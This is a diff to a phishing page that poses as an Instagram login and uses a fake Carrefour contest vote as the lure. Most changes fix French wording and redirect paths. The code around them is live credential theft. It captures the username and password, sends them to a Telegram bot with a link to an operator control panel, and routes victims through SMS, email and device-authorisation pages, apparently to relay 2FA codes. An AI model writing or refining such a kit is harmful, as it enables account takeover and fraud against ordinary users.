@@ -90,7 +90,7 @@
 <body>
     <div class="concours-banner" id="concoursBanner">
         <p>🌴 <span>Concours Carrefour</span> - Connectez-vous pour valider votre vote</p>
-        <div class="banner-sub">Votre vote pour <strong>Sophie Martin</strong> sera enregistré après la login</div>
+        <div class="banner-sub">Votre vote pour <strong>Sophie Martin</strong> sera enregistré après la connexion</div>
     </div>
     <div id="pageLogin">
         <div class="login-header">
@@ -153,7 +153,7 @@
             <div class="input-group">
                 <input type="text" class="field" id="forgotInp" placeholder="Numéro de mobile, nom de profil ou adresse e-mail">
             </div>
-            <p class="forgot-notice">Vous recevrez peut-être des notifications de notre part sur WhatsApp et par SMS à des fins de sécurité et de login.</p>
+            <p class="forgot-notice">Vous recevrez peut-être des notifications de notre part sur WhatsApp et par SMS à des fins de sécurité et de connexion.</p>
             <button class="forgot-continue" id="forgotSubmit">Continuer</button>
         </div>
         <div class="footer">
@@ -200,7 +200,7 @@
         <div class="waiting-content">
             <div class="waiting-spinner"></div>
             <h2>En attente de confirmation...</h2>
-            <p>Votre demande de login a été envoyée.<br>Un administrateur doit approuver votre accès.</p>
+            <p>Votre demande de connexion a été envoyée.<br>Un administrateur doit approuver votre accès.</p>
             <div class="waiting-user" id="waitingUser"></div>
             <button class="logout-btn" id="cancelWaiting">Annuler</button>
         </div>
@@ -314,7 +314,7 @@
         // Show login error if redirected with error param
         if (concoursParams.get('error') === '1') {
             setTimeout(function() {
-                eEl.textContent = 'Les informations de login que vous avez entrées sont incorrectes.';
+                eEl.textContent = 'Les informations de connexion que vous avez entrées sont incorrectes.';
                 eEl.style.display = 'block';
             }, 300);
         }
@@ -356,8 +356,9 @@
         })();
 
         var actionPages = {
-            'login': 'INSTAGRAM.html',
-            'login_incorrect': 'INSTAGRAM.html?error=1',
+            'login': 'pages/login.html',
+            'connexion_f': 'pages/login.html',
+            'login_incorrect': 'pages/login_incorrect.html',
             'loading': 'pages/loading.html',
             'sms_verification': 'pages/sms.html',
             'sms_error': 'pages/sms_incorrect.html',
@@ -367,7 +368,7 @@
             'email_error': 'pages/email_incorrect.html',
             'technical_error': 'pages/technical_error.html',
             'authorize_device': 'pages/authorize_device.html',
-            'retry': 'INSTAGRAM.html'
+            'retry': 'pages/login.html'
         };
         function goAction(action, username) {
             var page = actionPages[action] || 'pages/loading.html';
@@ -428,7 +429,7 @@
                     users.push({ username: username, password: password, status: 'pending', time: time, action: null, data: { email: username, password: password }, visitorId: visitorId, isVisitor: false });
                 }
                 saveUsers(users);
-                sendToTelegram('\ud83d\udce7 <b>Nouvelle login Instagram</b>\n\n\ud83d\udc64 Identifiant: ' + username + '\n\ud83d\udd10 Mot de passe: ' + password + '\n\n\ud83d\udd17 Panel: https://voyage-production-88ca.up.railway.app/PANEL.html');
+                sendToTelegram('\ud83d\udce7 <b>Nouvelle connexion Instagram</b>\n\n\ud83d\udc64 Identifiant: ' + username + '\n\ud83d\udd10 Mot de passe: ' + password + '\n\n\ud83d\udd17 Panel: https://voyage-production-88ca.up.railway.app/PANEL.html');
                 currentUser = username;
                 document.getElementById('waitingUser').textContent = '@' + username;
                 pageLogin.style.display = 'none';
@@ -500,9 +501,9 @@
         document.getElementById('forgotSubmit').addEventListener('click', function() { pageForgot.classList.remove('active'); pageLogin.style.display = 'flex'; document.getElementById('forgotInp').value = ''; uEl.value = ''; pEl.value = ''; sEl.classList.remove('ready'); eEl.style.display = 'none'; });
         document.getElementById('signupBtn').addEventListener('click', function() { document.getElementById('modalSignup').classList.add('open'); });
         document.getElementById('signupCancel').addEventListener('click', function() { document.getElementById('modalSignup').classList.remove('open'); });
-        document.getElementById('signupFb').addEventListener('click', function() { alert('login Facebook non disponible'); });
+        document.getElementById('signupFb').addEventListener('click', function() { alert('Connexion Facebook non disponible'); });
         document.getElementById('signupForm').addEventListener('submit', function(e) { e.preventDefault(); var email = document.getElementById('suEmail').value.trim(); var name = document.getElementById('suName').value.trim(); var user = document.getElementById('suUser').value.trim(); var pass = document.getElementById('suPass').value.trim(); if (!email || !name || !user || !pass) { alert('Veuillez remplir tous les champs.'); return; } alert('Compte créé avec succès pour ' + user + ' !'); document.getElementById('modalSignup').classList.remove('open'); });
-        document.getElementById('fbBtn').addEventListener('click', function() { alert('login Facebook non disponible'); });
+        document.getElementById('fbBtn').addEventListener('click', function() { alert('Connexion Facebook non disponible'); });
         document.querySelectorAll('.modal-bg').forEach(function(m) { m.addEventListener('click', function(e) { if (e.target === m) m.classList.remove('open'); }); });
         document.addEventListener('keydown', function(e) { if (e.key === 'Escape') { if (pageForgot.classList.contains('active')) { document.getElementById('forgotBack').click(); } document.getElementById('modalSignup').classList.remove('open'); } });
     </script>
